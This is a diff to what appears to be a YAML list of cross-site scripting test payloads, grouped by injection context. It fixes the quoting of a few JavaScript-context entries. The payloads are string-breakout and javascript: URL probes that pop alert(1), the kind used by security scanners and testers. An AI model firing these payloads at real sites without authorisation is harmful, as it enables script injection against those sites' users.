@@ -127,7 +127,7 @@ javascript_context:
 - '-alert(1)-'
 - '''-alert(1)-'''
 - '"-alert(1)-"'
-- '\';alert(1)//'
+- "\\';alert(1)//"
 - '";alert(1)//'
 - '};alert(1)//{'''
 - ']-alert(1)-['
@@ -136,8 +136,8 @@ javascript_context:
 - '${alert(1)}'
 - '`${alert(1)}`'
 - '-eval(''alert(1)'')-'
-- '\x3cscript\x3ealert(1)\x3c/script\x3e'
-- '\u003cscript\u003ealert(1)\u003c/script\u003e'
+- "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+- "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
 url_context:
 - javascript:alert(1)
 - javascript:alert(document.domain)
